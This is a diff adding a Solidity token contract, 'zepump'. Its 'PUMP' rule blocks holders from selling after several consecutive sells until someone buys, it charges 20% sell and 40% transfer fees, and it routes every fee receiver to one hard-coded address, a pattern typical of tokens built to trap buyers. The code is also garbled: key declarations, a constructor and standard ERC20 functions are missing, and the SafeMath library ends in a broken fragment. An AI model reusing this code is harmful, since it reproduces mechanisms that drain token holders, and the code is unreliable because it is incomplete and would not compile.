@@ -1,0 +1,173 @@
+contract zepump is IERC20, tokenStaking, Ownable {
+    uint256 public _maxTxAmount = ( _totalSupply * 150 ) / 10000;
+    uint256 public _maxSellAmount = ( _totalSupply * 150 ) / 10000;
+    uint256 public _maxWalletToken = ( _totalSupply * 150 ) / 10000;
+    mapping (address => uint256) _balances;
+    mapping (address => mapping (address => uint256)) private _allowances;
+    mapping(address => bool) private isFeeExempt;
+    IRouter router;
+    address public pair;
+    uint256 private liquidityFee = 0;
+    uint256 private marketingFee = 200;
+    uint256 private developmentFee = 200;
+    uint256 private stakingFee = 0;
+    uint256 private tokenFee = 0;
+    uint256 private totalFee = 1000;
+    uint256 private sellFee = 2000;
+    uint256 private transferFee = 4000;
+    uint256 private denominator = 10000;
+    bool private swapEnabled = true;
+    bool private tradingAllowed = false;
+    bool public PUMP = true;
+    uint256 public PUMPSells;
+    uint256 public PUMPTrigger = 3;
+    bool public PUMPBuyNeeded = false;
+    uint256 private swapTimes;
+    bool private swapping;
+    uint256 private swapAmount = 3;
+    uint256 private swapThreshold = ( _totalSupply * 500 ) / 100000;
+    uint256 private minTokenAmount = ( _totalSupply * 10 ) / 100000;
+    uint256 public PUMPMinAmount = 1;
+    modifier lockTheSwap {swapping = true; _; swapping = false;}
+    mapping(address => uint256) public amountStaked;
+    address internal constant DEAD = 0x000000000000000000000000000000000000dEaD;
+    address internal development_receiver = 0x13aCbde269f2CEDBaAFFd18321d0AAA223947a00; 
+    address internal marketing_receiver = 0x13aCbde269f2CEDBaAFFd18321d0AAA223947a00;
+    address internal liquidity_receiver = 0x13aCbde269f2CEDBaAFFd18321d0AAA223947a00;
+    address internal staking_receiver = 0x13aCbde269f2CEDBaAFFd18321d0AAA223947a00;
+    address internal token_receiver = 0x000000000000000000000000000000000000dEaD;
+    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}
+    function transfer(address recipient, uint256 amount) public override returns (bool) {_transfer(msg.sender, recipient, amount);return true;}
+
+    function preTxCheck(address sender, address recipient, uint256 amount) internal view {
+        require(sender != address(0), "ERC20: transfer from the zero address");
+        require(recipient != address(0), "ERC20: transfer to the zero address");
+        require(amount <= balanceOf(sender),"ERC20: below available balance threshold");
+    }
+
+    function _transfer(address sender, address recipient, uint256 amount) private {
+        preTxCheck(sender, recipient, amount);
+        checkTradingAllowed(sender, recipient);
+        checkTxLimit(sender, recipient, amount);
+        checkMaxWallet(sender, recipient, amount);
+        checkPUMP(sender, recipient, amount);
+        swapbackCounters(sender, recipient, amount);
+        swapBack(sender, recipient);
+        _balances[sender] = _balances[sender].sub(amount);
+        uint256 amountReceived = shouldTakeFee(sender, recipient) ? takeFee(sender, recipient, amount) : amount;
+        _balances[recipient] = _balances[recipient].add(amountReceived);
+        emit Transfer(sender, recipient, amountReceived);
+    }
+
+    function checkTradingAllowed(address sender, address recipient) internal view {
+        if(!isFeeExempt[sender] && !isFeeExempt[recipient]){require(tradingAllowed, "ERC20: Trading is not allowed");}
+
+    }
+    function checkPUMP(address sender, address recipient, uint256 amount) internal {
+        if(PUMP && !swapping){ 
+        if(recipient == pair && !isFeeExempt[sender]){PUMPSells = PUMPSells.add(uint256(1));}
+        if(sender == pair && !isFeeExempt[recipient] && amount >= PUMPMinAmount){PUMPSells = uint256(0);}
+        if(PUMPSells > PUMPTrigger){PUMPBuyNeeded = true;}
+        if(PUMPBuyNeeded && !isFeeExempt[recipient] && !isFeeExempt[sender]){
+            require(sender == pair, "ERC20: PUMP purchase required"); if(amount >= PUMPMinAmount){PUMPSells = uint256(0); PUMPBuyNeeded = false;}}}
+    }
+
+    function checkMaxWallet(address sender, address recipient, uint256 amount) internal view {
+        if(!isFeeExempt[sender] && !isFeeExempt[recipient] && recipient != address(pair) && recipient != address(DEAD)){
+            require((_balances[recipient].add(amount)) <= _maxWalletToken, "ERC20: exceeds maximum wallet amount.");}
+    }
+
+    function swapbackCounters(address sender, address recipient, uint256 amount) internal {
+        if(recipient == pair && !isFeeExempt[sender] && amount >= minTokenAmount){swapTimes += uint256(1);}
+    }
+
+    function checkTxLimit(address sender, address recipient, uint256 amount) internal view {
+        if(amountStaked[sender] > uint256(0)){require((amount.add(amountStaked[sender])) <= _balances[sender], "ERC20: exceeds maximum allowed not currently staked.");}
+        if(sender != pair){require(amount <= _maxSellAmount || isFeeExempt[sender] || isFeeExempt[recipient], "ERC20: tx limit exceeded");}
+        require(amount <= _maxTxAmount || isFeeExempt[sender] || isFeeExempt[recipient], "ERC20: tx limit exceeded");
+
+    }
+    function swapAndLiquify(uint256 tokens) private lockTheSwap {
+        uint256 _denominator = (liquidityFee.add(1).add(marketingFee).add(developmentFee).add(stakingFee)).mul(2);
+        uint256 tokensToAddLiquidityWith = tokens.mul(liquidityFee).div(_denominator);
+        uint256 toSwap = tokens.sub(tokensToAddLiquidityWith);
+        uint256 initialBalance = address(this).balance;
+        swapTokensForETH(toSwap);
+        uint256 deltaBalance = address(this).balance.sub(initialBalance);
+        uint256 unitBalance= deltaBalance.div(_denominator.sub(liquidityFee));
+        uint256 ETHToAddLiquidityWith = unitBalance.mul(liquidityFee);
+        if(ETHToAddLiquidityWith > uint256(0)){addLiquidity(tokensToAddLiquidityWith, ETHToAddLiquidityWith, liquidity_receiver); }
+        uint256 marketingAmount = unitBalance.mul(2).mul(marketingFee);
+        if(marketingAmount > 0){payable(marketing_receiver).transfer(marketingAmount);}
+        uint256 stakingAmount = unitBalance.mul(2).mul(stakingFee);
+        if(stakingAmount > 0){payable(staking_receiver).transfer(stakingAmount);}
+        if(address(this).balance > uint256(0)){payable(development_receiver).transfer(address(this).balance);}
+
+    }
+    function addLiquidity(uint256 tokenAmount, uint256 ETHAmount, address receiver) private {
+        _approve(address(this), address(router), tokenAmount);
+        router.addLiquidityETH{value: ETHAmount}(
+            address(this),
+            tokenAmount,
+            0,
+            0,
+            address(receiver),
+            block.timestamp);
+    }
+
+    function swapTokensForETH(uint256 tokenAmount) private {
+        address[] memory path = new address[](2);
+        path[0] = address(this);
+        path[1] = router.WETH();
+        _approve(address(this), address(router), tokenAmount);
+        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
+            tokenAmount,
+            0,
+            path,
+            address(this),
+            block.timestamp);
+
+    }
+    function shouldSwapBack(address sender, address recipient) internal view returns (bool) {
+        bool aboveThreshold = balanceOf(address(this)) >= swapThreshold;
+        return !swapping && swapEnabled && tradingAllowed && !isFeeExempt[sender] 
+            && recipient == pair && swapTimes >= swapAmount && aboveThreshold;
+
+    }
+    function swapBack(address sender, address recipient) internal {
+        if(shouldSwapBack(sender, recipient)){swapAndLiquify(swapThreshold); swapTimes = uint256(0);}
+    }
+
+    function shouldTakeFee(address sender, address recipient) internal view returns (bool) {
+        return !isFeeExempt[sender] && !isFeeExempt[recipient];
+
+    }
+    function getTotalFee(address sender, address recipient) internal view returns (uint256) {
+        if(recipient == pair){return sellFee;}
+        if(sender == pair){return totalFee;}
+        return transferFee;
+
+    }
+    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
+        if(getTotalFee(sender, recipient) > 0){
+        uint256 feeAmount = amount.div(denominator).mul(getTotalFee(sender, recipient));
+        _balances[address(this)] = _balances[address(this)].add(feeAmount);
+        emit Transfer(sender, address(this), feeAmount);
+        if(tokenFee > uint256(0)){_transfer(address(this), address(token_receiver), amount.div(denominator).mul(tokenFee));}
+        return amount.sub(feeAmount);} return amount;
+    }
+
+    function _approve(address owner, address spender, uint256 amount) private {
+        require(owner != address(0), "ERC20: approve from the zero address");
+        require(spender != address(0), "ERC20: approve to the zero address");
+        _allowances[owner][spender] = amount;
+        emit Approval(owner, spender, amount);
+    }
+}
+library SafeMath {
+    function add(uint256 a, uint256 b) internal pure returns (uint256) {return a + b;}
+    function sub(uint256 a, uint256 b) internal pure returns (uint256) {return a - b;}
+    function mul(uint256 a, uint256 b) internal pure returns (uint256) {return a * b;}
+    function div(uint256 a, uint256 b) internal pure returns (uint256) {return a / b;}
+        unchecked{require(b > 0, errorMessage); return a % b;}}}
+
